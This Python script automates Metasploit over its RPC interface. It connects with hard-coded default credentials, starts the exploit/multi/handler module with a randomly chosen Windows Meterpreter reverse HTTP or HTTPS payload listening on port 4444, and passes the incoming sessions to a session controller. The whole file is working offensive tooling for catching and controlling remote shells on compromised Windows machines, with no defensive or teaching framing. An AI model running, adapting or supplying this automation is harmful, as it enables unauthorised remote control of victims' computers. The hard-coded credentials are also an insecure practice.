#!/usr/bin/env python3

from msfrpcdHandler import msfrpcdHandler
from pymetasploit3.msfrpc import MsfRpcError, MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
from connectMsfRpcClient import connectMsfRpcClient
from sessionMod import sessionMod
import sys
import time
import random

class msfAutomation:
    choose_payload = ['windows/meterpreter/reverse_http', 'windows/meterpreter/reverse_https']
    def __init__(self):
        print("[!]Starting Automation...")
        msfrpcdHandler()
        self.msfclient = connectMsfRpcClient('msf', 'password', '55553', '127.0.0.1', 'False')
        if self.msfclient.connect() is False:
            sys.exit()
        print("[!]Running exploit: exploit/multi/handler")
        exploit = self.msfclient.client.modules.use('exploit', 'exploit/multi/handler')
        time.sleep(5)
        randomPayload = random.choice(self.choose_payload)
        print("[!]Using payload: ", randomPayload)
        _payload = self.msfclient.client.modules.use('payload', randomPayload)
        _payload['LHOST'] = '0.0.0.0'
        _payload['LPORT'] = '4444'
        print(_payload.runoptions)
        time.sleep(5)
        exploit.execute(payload=_payload)
        print("[!]Executing exploit...")
        time.sleep(10)
        sessionMod(self.msfclient).activeSessionController()

msfAutomation()
